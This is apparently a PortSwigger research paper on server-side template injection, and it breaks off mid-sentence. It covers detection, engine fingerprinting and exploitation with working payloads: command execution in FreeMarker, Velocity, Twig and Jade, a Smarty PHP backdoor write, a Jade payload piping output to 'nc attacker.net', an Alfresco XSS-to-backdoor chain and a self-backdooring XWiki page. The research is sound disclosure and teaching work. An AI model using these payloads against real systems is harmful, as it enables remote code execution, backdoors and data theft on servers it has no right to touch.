What we have here is essentially server-side code execution inside a sandbox. Depending on the template engine used, it may be possible to escape the sandbox and execute arbitrary code. <br>
<br>
This vulnerability typically arises through developers intentionally letting users submit or edit templates - some template engines offer a secure mode for this express purpose. It is far from specific to marketing applications - any features that support advanced user-supplied markup may be vulnerable, including wiki-pages, reviews, and even comments. Template injection can also arise by accident, when user input is simply concatenated directly into a template. This may seem slightly counter-intuitive, but it is equivalent to SQL Injection vulnerabilities occurring in poorly written prepared statements, which are a relatively common occurrence. Furthermore, unintentional template injection is extremely easy to miss as there typically won't be any visible cues. As with all input based vulnerabilities, the input could originate from out of band sources. For example, it may occur as a Local File Include (LFI) variant, exploitable through classic LFI techniques such as code embedded in log files, <a href="http://www.ush.it/2008/07/09/local-file-inclusion-lfi-of-session-files-to-root-escalation/">session files</a>, or <span class="code"><a href="http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/">/proc/self/env</a></span>.<br>
<br>
The 'Server-Side' qualifier is used to distinguish this from vulnerabilities in client-side templating libraries such as those provided by jQuery and KnockoutJS. Client-side template injection can often be abused for XSS attacks, as <a href="https://code.google.com/p/mustache-security/">detailed by Mario Heiderich</a>. This paper will exclusively cover attacking server-side templating, with the goal of obtaining arbitrary code execution. <br>
<div class="page-break">
</div>
<h2>
<a href="https://www.blogger.com/null" name="Methodology">Template Injection Methodology</a> </h2>
I have defined the following high level methodology to capture an efficient attack process, based on my experience auditing a range of vulnerable applications and template engines:<br>
<a href="http://2.bp.blogspot.com/-AuKtbK95XLc/VayupXh78gI/AAAAAAAAAEw/VVSqLwQUrOQ/s1600/pretty%2Bmethodology%2Bdiagram.png" imageanchor="1"><img border="0" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/pretty+methodology+diagram.png" style="margin-bottom: 10px; margin-top: 10px;"></a>
<br>
<h3>
<a href="https://www.blogger.com/null" name="Detect">Detect</a></h3>
This vulnerability can appear in two distinct contexts, each of which requires its own detection method:<br>
<h4>
1. Plaintext context</h4>
Most template languages support a freeform 'text' context where you can directly input HTML. It will typically appear in one of the following ways:
<br>
<div class="code-box">
smarty=Hello {user.name}<br>
Hello user1
</div>
<div class="code-box">
freemarker=Hello ${username}<br>
Hello newuser
</div>
<div class="code-box">
any=&lt;b&gt;Hello&lt;/b&gt;<br>
&lt;b&gt;Hello&lt;b&gt;
</div>
This frequently results in XSS, so the presence of XSS can be used as a cue for more thorough template injection probes. Template languages use syntax chosen explicitly not to clash with characters used in normal HTML, so it's easy for a manual blackbox security assessment to miss template injection entirely.&nbsp;To detect it, we need to invoke the template engine by embedding a statement. There are a huge number of template languages but many of them share basic syntax characteristics. We can take advantage of this by sending generic, template-agnostic payloads using basic operations to detect multiple template engines with a single HTTP request:<br>
<div class="code-box">
smarty=Hello ${7*7}<br>
Hello 49<br>
<br>
freemarker=Hello ${7*7}<br>
Hello 49</div>
<div class="page-break">
</div>
<h4>
2. Code context</h4>
User input may also be placed within a template statement, typically as a variable name:<br>
<div class="code-box">
personal_greeting=username<br>
Hello user01
</div>
This variant is even easier to miss during an assessment, as it doesn't result in obvious XSS and is almost indistinguishable from a simple hashmap lookup. Changing the value from <span class="code">username</span> will typically either result in a blank result or the application erroring out. It can be detected in a robust manner by verifying the parameter doesn't have direct XSS, then breaking out of the template statement and injecting HTML tag after it:<br>
<div class="code-box">
personal_greeting=username&lt;tag&gt;<br>
Hello <br>
<br>
personal_greeting=username}}&lt;tag&gt;<br>
Hello user01 &lt;tag&gt;
</div>
<h3>
<a href="https://www.blogger.com/null" name="Identify">Identify</a></h3>
After detecting template injection, the next step is to identify the template engine in use. This step is sometimes as trivial as submitting invalid syntax, as template engines may identify themselves in the resulting error messages. However, this technique fails when error messages are supressed, and isn't well suited for automation. We have instead automated this in Burp Suite using a decision tree of language-specific payloads. Green and red arrows represent 'success' and 'failure' responses respectively. In some cases, a single payload can have multiple distinct success responses - for example, the probe <span class="code">{{7*'7'}}</span> would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use.<br>
<a href="http://1.bp.blogspot.com/-txouq1ZZJw4/Vayv3Np5VGI/AAAAAAAAAFY/6zY9F6SFSEY/s1600/Screen%2BShot%2B2015-07-20%2Bat%2B09.21.56.png" imageanchor="1"><img border="0" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/Screen+Shot+2015-07-20+at+09.21.56.png" style="margin-bottom: 10px; margin-top: 10px;" width="280"></a>
<br>
<h3>
<a href="https://www.blogger.com/null" name="Exploit">Exploit</a></h3>
<h4>
Read</h4>
The first step after finding template injection and identifying the template engine is to read the documentation. The importance of this step should not be underestimated; one of the zeroday exploits to follow was derived purely from studious documentation perusal. Key areas of interest are: <br>
<ul>
<li>
'For Template Authors' sections covering basic syntax.</li>
<li>
'Security Considerations' - chances are whoever developed the app you're testing didn't read this, and it may contain some useful hints.</li>
<li> Lists of builtin methods, functions, filters, and variables. </li>
<li>
Lists of extensions/plugins - some may be enabled by default.</li>
</ul>
<br>
<h4>
Explore</h4>
Assuming no exploits have presented themselves, the next step is to explore the environment to find out exactly what you have access to. You can expect to find both default objects provided by the template engine, and application-specific objects passed in to the template by the developer. Many template systems expose a 'self' or namespace object containing everything in scope, and an idiomatic way to list an object's attributes and methods.<br>
<br>
<div class="page-break">
</div>
If there's no builtin self object you're going to have to bruteforce variable names. I have created a wordlist for this by crawling GitHub for GET/POST variable names used in PHP projects, and publicly released it via FuzzDB and Burp Intruder's wordlist collection.<br>
Developer-supplied objects are particularly likely to contain sensitive information, and may vary between different templates within an application, so this process should ideally be applied to every distinct template individually.<br>
<h4>
Attack</h4>
At this point you should have a firm idea of the attack surface available to you and be able to proceed with traditional security audit techniques, reviewing each function for exploitable vulnerabilities. It's important to approach this in the context of the wider application - some functions can be used to exploit application-specific features. The examples to follow will use template injection to trigger arbitrary object creation, arbitrary file read/write, remote file include, information disclosure and privilege escalation vulnerabilities. <br>
<div class="page-break">
</div>
<h2>
<a href="https://www.blogger.com/null" name="Exploit Development">Exploit Development</a></h2>
I have audited a range of popular template engines to show the exploit methodology in practice, and make a case for the severity of the issue. The findings may appear to show flaws in template engines themselves, but unless an engine markets itself as suitable for user-submitted templates the responsibility for preventing template injection ultimately lies with web application developers.<br>
<br>
Sometimes, thirty seconds of documentation perusal is sufficient to gain RCE. For example, exploiting unsandboxed Smarty is as easy as:<br>
<div class="code-box">
{php}echo `id`;{/php}</div>
Mako is similarly easy to exploit:<br>
<div class="code-box">
&lt;%<br>
import os<br>
x=os.popen('id').read()<br>
%&gt;<br>
${x}</div>
However, many template engines try to prevent application logic from creeping into templates by restricting their ability to execute arbitrary code. Others explicitly try to restrict and sandbox templates as a security measure to enable safe processing of untrusted input. Between these measures, developing a template backdoor can prove quite a challenging process.<br>
<div class="page-break">
</div>
<h2>
<a href="https://www.blogger.com/null" name="FreeMarker">FreeMarker</a></h2>
FreeMarker is one of the most popular Java template languages, and the language I've seen exposed to users most frequently. This makes it surprising that the official website explains the dangers of allowing user-supplied templates: <br>
<blockquote cite="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/app_faq.html" class="rounded-corner-box">
<div style="color: #0050b2;">
22.  Can I allow users to upload templates and what are the security implications?</div>
<br>
In general you shouldn't allow that, unless those users are system administrators or other trusted personnel. Consider templates as part of the source code just like *.java files are.&nbsp;If you still want to allow users to upload templates, here are what to consider: <br>
<cite><br>
http://freemarker.org/docs/app_faq.html#faq_template_uploading_security</cite></blockquote>
Buried behind some lesser risks like Denial of Service, we find this: 
<br>
<blockquote cite="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/app_faq.html" class="rounded-corner-box">
<ul>
<li>
The <tt style="color: #a03d10;">new</tt> built-in
                (<tt style="color: #a03d10;">Configuration.setNewBuiltinClassResolver</tt>,
                <tt style="color: #a03d10;">Environment.setNewBuiltinClassResolver</tt>):
                It's used in templates like
                <tt style="color: #a03d10;">"com.example.SomeClass"?new()</tt>, and is
                important for FTL libraries that are partially implemented in
                Java, but shouldn't be needed in normal templates. While
                <tt style="color: #a03d10;">new</tt> will not instantiate classes that are
                not <tt style="color: #a03d10;">TemplateModel</tt>-s, FreeMarker contains a
                <tt style="color: #a03d10;">TemplateModel</tt> class that can be used to
                create arbitrary Java objects. Other "dangerous"
                <tt style="color: #a03d10;">TemplateModel</tt>-s can exist in you
                class-path. Plus, even if a class doesn't implement
                <tt style="color: #a03d10;">TemplateModel</tt>, its static initialization
                will be run. To avoid these, you should use a
                <tt style="color: #a03d10;">TemplateClassResolver</tt> that restricts the
                accessible classes (possibly based on which template asks for
                them), such as
                <tt style="color: #a03d10;">TemplateClassResolver.ALLOWS_NOTHING_RESOLVER</tt>.</li>
</ul>
</blockquote>
This warning is slightly cryptic, but it does suggest that the <span class="code">new</span> builtin may offer a promising avenue of exploitation.&nbsp;Let's have a look at the documentation on <span class="code">new</span>:<br>
<blockquote cite="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/ref_builtins_expert.html" class="rounded-corner-box">
This built-in can be a security concern because the template author can create arbitrary Java objects and then use them, as far as they implement TemplateModel. Also the template author can trigger static initialization for classes that don't even implement TemplateModel. [snip] If you are allowing not-so-much-trusted users to upload templates then you should definitely look into this topic.<br>
<br>
<cite>http://freemarker.org/docs/ref_builtins_expert.html#ref_builtin_new</cite></blockquote>
Are there any useful classes implementing <span class="code">TemplateModel</span>? Let's take a look at the JavaDoc:<br>
<a href="http://3.bp.blogspot.com/-W2T5fWoZrlU/VayulV3F1UI/AAAAAAAAAFE/CmKm4vPO-7U/s1600/3%2B-%2BImplementing%2Bclasses.png" imageanchor="1"><img border="0" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/3+-+Implementing+classes.png" style="margin-bottom: 10px; margin-top: 10px;" width="280"></a>
One of these class names stands out - <span class="code">Execute</span>. <br>
<div class="page-break">
</div>
The details confirm it does what you might expect - takes input and executes it:<br>
<blockquote class="rounded-corner-box">
public class <b>Execute</b><br>
implements TemplateMethodModel<br>
<br>
Given FreeMarker the ability to execute external commands. Will fork a process, and inline anything that process sends to stdout in the template.
</blockquote>
Using it is as easy as:<br>
<div class="code-box">
&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ ex("id") }<br>
<br>
uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7) </div>
This payload will come in useful later.<br>
<div class="page-break">
</div>
<h2>
<a href="https://www.blogger.com/null" name="Velocity">Velocity</a></h2>
<a href="https://velocity.apache.org/">Velocity</a>, another popular Java templating language, is trickier to exploit. There is no 'Security Considerations' page to helpfully point out the most dangerous functions, and also no obvious list of default variables. The following screenshot shows the Burp Intruder tool being used to bruteforce variable names, with the variable name on the left in the 'payload' column and the server's output on the right.<br>
<a href="http://2.bp.blogspot.com/-GRETH78q9xI/VayujLtc6NI/AAAAAAAAAFQ/D9umw-1m3ic/s1600/1%2B-%2BVariable%2Bbruteforce.png" imageanchor="1"><img border="0" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/1+-+Variable+bruteforce.png" style="margin-bottom: 10px; margin-top: 10px;" width="280"></a>
The <span class="code">class</span> variable (highlighted) looks particularly promising because it returns a generic Object. Googling it leads us to https://velocity.apache.org/tools/releases/2.0/summary.html:<br>
<blockquote cite="https://velocity.apache.org/tools/releases/2.0/summary.html" class="rounded-corner-box">
<strong>ClassTool:</strong> tool meant to use Java reflection in templates <br>
default key: $class </blockquote>
One method and one property stand out:<br>
<blockquote class="rounded-corner-box">
<table style="border-collapse: collapse;">
<tbody>
<tr><td style="border: 2px solid #ffffff; padding-right: 10px;">$class.inspect(class/object/string)</td><td style="border: 2px solid #ffffff;">returns a new ClassTool instance that inspects the specified class or object</td></tr>
<tr><td style="border: 2px solid #ffffff;">$class.type</td><td style="border: 2px solid #ffffff;">returns the actual Class being inspected</td></tr>
</tbody></table>
<br>
<cite>https://velocity.apache.org/tools/releases/2.0/summary.html</cite>
</blockquote>
In other words, we can chain <span class="code">$class.inspect</span> with <span class="code">$class.type</span> to obtain references to arbitrary objects. We can then execute arbitrary shell commands on the target system using <span class="code"><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html#exec%28java.lang.String%29">Runtime.exec()</a></span>. This can be confirmed using the following template, designed to cause a noticeable time delay.<br>
<div class="code-box">
$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()<br>
[5 second time delay]
<br>
0</div>
Getting the shell command's output is a bit trickier (this is Java after all): <br>
<div class="code-box">
#set($str=$class.inspect("java.lang.String").type)<br>
#set($chr=$class.inspect("java.lang.Character").type)<br>
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))<br>
$ex.waitFor()<br>
#set($out=$ex.getInputStream())<br>
#foreach($i in [1..$out.available()])<br>
$str.valueOf($chr.toChars($out.read()))<br>
#end<br>
<br>
tomcat7</div>
<div class="page-break">
</div>
<h2>
<a href="https://www.blogger.com/null" name="Smarty">Smarty</a></h2>
<a href="http://www.smarty.net/">Smarty</a> is one of the most popular PHP template languages, and offers <a href="http://www.smarty.net/docs/en/advanced.features.tpl#advanced.features.security">a secure mode</a> for untrusted template execution. This enforces a whitelist of safe PHP functions, so templates can't directly invoke <span class="code">system()</span>. However, it doesn't prevent us from invoking methods on any classes we can obtain a reference to. 
  
  The documentation reveals that the <span class="code">$smarty</span> builtin variable can be used to access various environment variables, including the location of the current file at <span class="code">$SCRIPT_NAME</span>. 
  
  Variable name bruteforcing quickly reveals the self object, which is a reference to the current template. There is very little documentation on this, but the code is all on GitHub. The <span class="code"><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385">getStreamVariable</a></span> method is invaluable:<br>
<a href="http://4.bp.blogspot.com/-JjUJ8QCS6sI/VayuiBXriWI/AAAAAAAAACs/T-fRxWFohBw/s1600/0%2B-%2BgetStreamVariable%2Bmethod.png" imageanchor="1"><img border="0" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/0+-+getStreamVariable+method.png" style="margin-bottom: 10px; margin-top: 10px;" width="280"></a>
The <span class="code">getStreamVariable</span> method can be used to read any file the server has read+write permission on:<br>
<div class="code-box">
{self::getStreamVariable("file:///proc/self/loginuid")}<br>
<br>
1000<br>
<br>
{self::getStreamVariable($SCRIPT_NAME)}<br>
<br>
&lt;?php<br>
define("SMARTY_DIR",'/usr/share/php/Smarty/');<br>
require_once(SMARTY_DIR.'Smarty.class.php');<br>
...
</div>
Furthermore, we can call arbitrary static methods. Smarty exposes a range of invaluable static classes, including <span class="code"><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">Smarty_Internal_Write_File</a></span>, which has the following method:<br>
<div class="code-box">
public function writeFile($_filepath, $_contents, Smarty $smarty)</div>
This function is designed to create and overwrite arbitrary files, so it can easily be used to create a PHP backdoor inside the webroot, granting us near-complete control over the server. There's one catch - the third argument has a <span class="code">Smarty</span> type hint, so it will reject any non-<span class="code">Smarty</span> type inputs. This means that we need to obtain a reference to a <span class="code">Smarty</span> object. <br>
<div class="page-break">
</div>
Further code review reveals that the <span class="code"><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L372">self::clearConfig()</a></span> method is suitable:<br>
<div class="code-box">
/**<br>
* Deassigns a single or all config variables<br>
*<br>
* @param&nbsp; string $varname variable name or null<br>
*<br>
* @return Smarty_Internal_Data current Smarty_Internal_Data (or Smarty or Smarty_Internal_Template) instance for chaining<br>
*/<br>
public function clearConfig($varname = null)<br>
{<br>
&nbsp; &nbsp; return Smarty_Internal_Extension_Config::clearConfig($this, $varname);<br>
}</div>
The final exploit, designed to overwrite the vulnerable file with a backdoor, looks like:<br>
<div class="code-box">
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php passthru($_GET['cmd']); ?&gt;",self::clearConfig())}</div>
<div class="page-break">
</div>
<h2>
<a href="https://www.blogger.com/null" name="Twig">Twig</a></h2>
Twig is another popular PHP templating language. It has restrictions similar to Smarty's secure mode by default, with a couple of significant additional limitations - it isn't possible to call static methods, and the return values from all functions are cast to strings. This means we can't use functions to obtain object references like we did with Smarty's <span class="code">self::clearConfig()</span>. Unlike Smarty, Twig has documented its self object (<span class="code">_self</span>) so we don't need to bruteforce any variable names. <br>
<br>
The <span class="code">_self</span> object doesn't contain any useful methods, but does have an <span class="code">env</span> attribute that refers to a <span class="code"><a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php">Twig_Environment</a></span> object, which looks more promising. The <span class="code"><a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L233">setCache</a></span> method on <span class="code">Twig_Environment</span> can be used to change the location Twig tries to load and execute compiled templates (PHP files) from. An obvious attack is therefore to introduce a Remote File Include vulnerability by setting the cache location to a remote server:<br>
<div class="code-box">
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}</div>
However, modern versions of PHP disable inclusion of remote files by default via <span class="code"><a href="http://php.net/manual/en/filesystem.configuration.php">allow_url_include</a></span>, so this approach isn't much use.<br>
<br>
Further code review reveals a call to the dangerous <span class="code"><a href="http://php.net/manual/en/function.call-user-func.php">call_user_func</a></span> function on line 874, in the <span class="code"><a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter</a></span> method. Provided we control the arguments to this, it can be used to invoke arbitrary PHP functions.</div>
<div class="code-box">
public function getFilter($name)<br>
{<br>
&nbsp; &nbsp; &nbsp; &nbsp; [snip]<br>
&nbsp; &nbsp; &nbsp; &nbsp; foreach ($this-&gt;filterCallbacks as $callback) {<br>
&nbsp; &nbsp; &nbsp; &nbsp; if (false !== $filter = call_user_func($callback, $name)) {<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return $filter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; }<br>
&nbsp; &nbsp; }<br>
&nbsp; &nbsp; return false;<br>
}<br>
<br>
public function registerUndefinedFilterCallback($callable)<br>
{<br>
&nbsp; &nbsp; $this-&gt;filterCallbacks[] = $callable;<br>
} </div>
Executing arbitrary shell commands is thus just a matter of registering <span class="code">exec</span> as a filter callback, then invoking <span class="code">getFilter</span>:<br>
<div class="code-box">
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}<br>
<br>
uid=1000(k) gid=1000(k) groups=1000(k),10(wheel)</div>
<div class="page-break">
</div>
<h2>
<a href="https://www.blogger.com/null" name="Twig (Sandboxed)">Twig (Sandboxed)</a></h2>
Twig's sandbox introduces additional restrictions. It disables attribute retrieval and adds a whitelist of functions and method calls, so by default we outright can't call any functions, even methods on a developer-supplied object. Taken at face value, this makes exploitation pretty much impossible. Unfortunately, <a href="https://github.com/twigphp/Twig/blob/d63ac2088e8d30137cde10f310ab89b06dab916b/lib/Twig/Sandbox/SecurityPolicy.php#L83">the source</a> tells a different story:<br>
<div class="code-box">
public function checkMethodAllowed($obj, $method)<br>
{<br>
&nbsp; if ($obj instanceof Twig_TemplateInterface || $obj instanceof Twig_Markup) {<br>
&nbsp; &nbsp; &nbsp; &nbsp; return true;<br>
&nbsp; &nbsp; }</div>
<div>
Thanks to this snippet we can call any method on objects that implement <span class="code">Twig_TemplateInterface</span>, which happens to include <span class="code">_self</span>. The <span class="code">_self</span> object's <span class="code"><a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Template.php#L139">displayBlock</a></span> method offers a high-level gadget of sorts:</div>
<div class="code-box">
public function displayBlock($name, array $context, array $blocks = array(), $useBlocks = true)<br>
{<br>
&nbsp; &nbsp; $name = (string) $name;<br>
&nbsp; &nbsp; if ($useBlocks &amp;&amp; isset($blocks[$name])) {<br>
&nbsp; &nbsp; &nbsp; &nbsp; $template = $blocks[$name][0];<br>
&nbsp; &nbsp; &nbsp; &nbsp; $block = $blocks[$name][1];<br>
&nbsp; &nbsp; } elseif (isset($this-&gt;blocks[$name])) {<br>
&nbsp; &nbsp; &nbsp; &nbsp; $template = $this-&gt;blocks[$name][0];<br>
&nbsp; &nbsp; &nbsp; &nbsp; $block = $this-&gt;blocks[$name][1];<br>
&nbsp; &nbsp; } else {<br>
&nbsp; &nbsp; &nbsp; &nbsp; $template = null;<br>
&nbsp; &nbsp; &nbsp; &nbsp; $block = null;<br>
&nbsp; &nbsp; }<br>
&nbsp; &nbsp; if (null !== $template) {<br>
&nbsp; &nbsp; &nbsp; &nbsp; try {<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $template-&gt;$block($context, $blocks);<br>
&nbsp; &nbsp; &nbsp; &nbsp; } catch (Twig_Error $e) {</div>
The <span class="code">$template-&gt;$block($context, $blocks);</span> call can be abused to bypass the function whitelist and call any method on any object the user can obtain a reference to. The following code will invoke the <span class="code">vulnerableMethod</span> method on the <span class="code">userObject</span> object, with no arguments.<br>
<div class="code-box">
{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}</div>
<br>
This can't be used to exploit the <span class="code">Twig_Environment-&gt;getFilter()</span> method used earlier as there is no way to obtain a reference to the <span class="code">Environment</span> object. However, it does mean that we can invoke methods on any objects the developer has passed into the template - the <span class="code">_context</span> object's attributes can be iterated over to see if anything useful is in scope. The XWiki example later illustrates exploiting a developer-provided class.<br>
<div class="page-break">
</div>
<h2>
<a href="https://www.blogger.com/null" name="Jade">Jade</a></h2>
<a href="http://jade-lang.com/">Jade</a> is a popular Node.js template engine. The website <a href="http://codepen.io/">CodePen.io</a> lets users submit templates in a number of languages by design, and is suitable for showing a purely blackbox exploitation process. For a visual depiction of the following steps, please refer to the presentation video (link pending).<br>
<br>
First off, confirm template execution:<br>
<div class="code-box">
= 7*7<br>
<br>
49
</div>
<br>
Locate the self object:<br>
<div class="code-box">
= root<br>
<br>
[object global]
</div>
<br>
Find a way to list object properties and functions:<br>
<div class="code-box">
- var x = root<br>
- for(var prop in x)<br>
&nbsp; &nbsp; , #{prop}<br>
<br>
, ArrayBuffer, Int8Array, Uint8Array, Uint8ClampedArray... global, process, GLOBAL, root</div>
<br>
Explore promising objects:<br>
<div class="code-box">
- var x = root.process<br>
- for(var prop in x)<br>
&nbsp; &nbsp; , #{prop}<br>
<br>
, title, version, moduleLoadList... mainModule, setMaxListeners, emit, once</div>
<br>
Bypass trivial countermeasures:<br>
<div class="code-box">
- var x = root.process.mainModule<br>
- for(var prop in x)<br>
&nbsp; &nbsp; , #{prop}<br>
<br>
CodePen removed the words below from your Jade because they could be used to do bad things. Please remove them and try again.<br>
-&gt;process<br>
-&gt;mainModule</div>
<div class="code-box">
- var x = root.process<br>
- x = x.mainModule<br>
- for(var prop in x)<br>
&nbsp; &nbsp; , #{prop}<br>
<br>
, id, exports, parent, filename, loaded, children, paths, load, require, _compile
</div>
<br>
Locate useful functions:<br>
<div class="code-box">
- var x = root.process<br>
- x = x.mainModule.require<br>
- x('a')<br>
<br>
Cannot find module 'a'
</div>
<br>
<div class="page-break">
</div>
Exploit:<br>
<div class="code-box">
- var x = root.process<br>
- x = x.mainModule.require<br>
- x = x('child_process')<br>
= x.exec('id | nc attacker.net 80')</div>
<a href="http://2.bp.blogspot.com/-Cnk-l436VdM/VayuoU-vwHI/AAAAAAAAAEs/FeqiytcobvI/s1600/8%2B-%2BExploit.png" imageanchor="1"><img border="0" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/8+-+Exploit.png" style="margin-bottom: 10px; margin-top: 10px;" width="280"></a>
<br>
<div class="page-break">
</div>
<h2>
<a href="https://www.blogger.com/null" name="Alfresco">Case Study: Alfresco</a></h2>
<a href="https://www.alfresco.com/">Alfresco</a> is a content management system (CMS) aimed at corporate users. Low privilege users can chain a stored XSS vulnerability in the comment system with FreeMarker template injection to gain a shell on the webserver. The FreeMarker payload created earlier can be used directly without any modification, but I've expanded it into a classic backdoor that executes the contents of the query string as a shell command:<br>
<div class="code-box">
&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ ex(url.getArgs())}</div>
<br>
Low privilege users do not have permission to edit templates, but the stored XSS vulnerability can be used to force an administrator to install our backdoor for us. I injected the following JavaScript to launch this attack:<br>
<div class="code-box">
tok = /Alfresco-CSRFToken=([^;]*)/.exec(document.cookie)[1];<br>
tok = decodeURIComponent(tok)<br>
do_csrf = new XMLHttpRequest();<br>
do_csrf.open("POST","http://"+document.domain+":8080/share/proxy/alfresco/api/node/workspace/SpacesStore/59d3cbdc-70cb-419e-a325-759a4c307304/formprocessor",false);<br>
do_csrf.setRequestHeader('Content-Type','application/json; charset=UTF-8');<br>
do_csrf.setRequestHeader('Alfresco-CSRFToken',tok);<br>
do_csrf.send('{"prop_cm_name":"folder.get.html.ftl","prop_cm_content":"&amp;lgt;#assign ex=\\"freemarker.template.utility.Execute\\"?new()&gt; ${ ex(url.getArgs())}","prop_cm_description":""}');</div>
<br>
The GUID value of templates can change across installations, but it's easily visible to low privilege users via the 'Data Dictionary'. Also, the administrative user is fairly restricted in the actions they can take, unlike other applications where administrators are intentionally granted complete control over the webserver.<br>
<a href="http://1.bp.blogspot.com/--0StqBXT-gI/Vayuohhb7uI/AAAAAAAAAEY/HKxh5zwchPY/s1600/alfresco%2Bexploit.png" imageanchor="1"><img border="0" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/alfresco+exploit.png" style="margin-bottom: 10px; margin-top: 10px;" width="280"></a>
<br>
Note that according to Alfresco's own documentation, SELinux will do nothing to confine the resulting shell:<br>
<blockquote cite="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/alfresco-start.html" class="rounded-corner-box">
If you installed Alfresco using the setup wizard, the alfresco.sh script included in the installation disables the Security-Enhanced Linux (SELinux) feature across the system.<br>
<cite>http://docs.alfresco.com/5.0/tasks/alfresco-start.html</cite>
</blockquote>
<div class="page-break">
</div>
<h2>
<a href="https://www.blogger.com/null" name="XWiki Enterprise">Case Study: XWiki Enterprise</a></h2>
<a href="http://www.xwiki.org/">XWiki Enterprise</a> is a feature-rich professional wiki. In the default configuration, anonymous users can register accounts on it and edit wiki pages, which can contain embedded Velocity template code. This makes it an excellent target for template injection. However, the generic Velocity payload created earlier will not work, as the <span class="code">$class</span> helper is not available.<br>
XWiki has the following to say about Velocity:<br>
<div cite="http://platform.xwiki.org/xwiki/bin/view/DevGuide/Scripting" class="code-box">
It doesn't require special permissions since it runs in a Sandbox, with access to only a few safe objects, and each API call will check the rights configured in the wiki, forbidding access to resources or actions that the current user shouldn't be allowed to retrieve/perform. Other scripting language require the user that wrote the script to have Programming Rights to execute them, but except this initial precondition, access is granted to all the resources on the server.
<br>
...<br>
Without programming rights, it's impossible to instantiate new objects, except literals and those safely offered by the XWiki APIs. Nevertheless, the XWiki API is powerful enough to allow a wide range of applications to be safely developed, if "the XWiki way" is properly followed.<br>
...<br>
Programming Rights are not required for viewing a page containing a script requiring Programming Rights, rights are only needed at save time<br>
<cite>http://platform.xwiki.org/xwiki/bin/view/DevGuide/Scripting</cite>
</div>
<br>
In other words, XWiki doesn't just support Velocity - it also supports unsandboxed Groovy and Python scripting. However, these are restricted to users with programming rights. This is good to know because it turns privilege escalation into arbitrary code execution. Since we can only use Velocity, we are limited to <a href="http://platform.xwiki.org/xwiki/bin/view/ScriptingDocumentation/">the XWiki APIs</a>.<br>
The <span class="code">$doc</span> class has some very interesting methods - astute readers may be able to identify an implied vulnerability in the following: <br>
<a href="http://4.bp.blogspot.com/-Zl6a_3sKQa4/Vayum-EvcKI/AAAAAAAAAE8/eQtmhQ_6BqU/s1600/4%2B-%2BSave%2Bzoomed%2Bnewapi.png" imageanchor="1"><img border="0" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/4+-+Save+zoomed+newapi.png" style="margin-bottom: 10px; margin-top: 10px;" width="280"></a>
<br>
The content author of a wiki page is the user who last edited it. The presence of distinct <span class="code">save</span> and <span class="code">saveAsAuthor</span> methods implies that the save method does not save as the author, but as the person currently viewing the page. In other words, a low privilege user can create a wiki page that, when viewed by a user with programming rights, silently modifies itself and saves the modifications with those rights. To inject the following Python backdoor:<br>
<div class="code-box">
{{python}}from subprocess import check_output<br>
q = request.get('q') or 'true'<br>
q = q.split(' ')<br>
print ''+check_output(q)+''<br>
{{/python}}</div>
<br>
<div class="page-break">
</div>
We just need to wrap it with some code to grab the privileges of a passing administrator:<br>
<div class="code-box">
innocent content<br>
{{velocity}}<br>
#if( $doc.hasAccessLevel("programming") )<br>
&nbsp; &nbsp; $doc.setContent("<br>
&nbsp; &nbsp; &nbsp; &nbsp; innocent content<br>
&nbsp; &nbsp; &nbsp; &nbsp; {{python}}from subprocess import check_output<br>
&nbsp; &nbsp; &nbsp; &nbsp; q = request.get('q') or 'true'<br>
&nbsp; &nbsp; &nbsp; &nbsp; q = q.split(' ')<br>
&nbsp; &nbsp; &nbsp; &nbsp; print ''+check_output(q)+''<br>
&nbsp; &nbsp; &nbsp; &nbsp; {{/python}}<br>
&nbsp; &nbsp; ")<br>
&nbsp; &nbsp; $doc.save()<br>
#end<br>
{{/velocity}}</div>
<br>
As soon as a wiki page with this content is viewed by a user with programming rights, it will backdoor itself. Any user who subsequently views the page can use it to execute arbitrary shell commands:<br>
